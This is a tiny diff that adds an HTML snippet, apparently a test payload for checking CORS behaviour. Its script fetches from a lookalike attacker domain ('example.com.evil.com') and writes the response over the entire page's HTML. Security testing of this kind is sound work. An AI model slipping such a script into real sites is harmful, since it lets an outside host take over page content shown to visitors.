@@ -1,0 +1,7 @@
+<!-- Also Checks CORS -->
+<script>
+  fetch("https://example.com.evil.com")
+    .then((res) => res.text())
+    .then((data) => (document.documentElement.innerHTML = data))
+    .catch((err) => (document.body.innerHTML = "CORS error: " + err));
+</script>
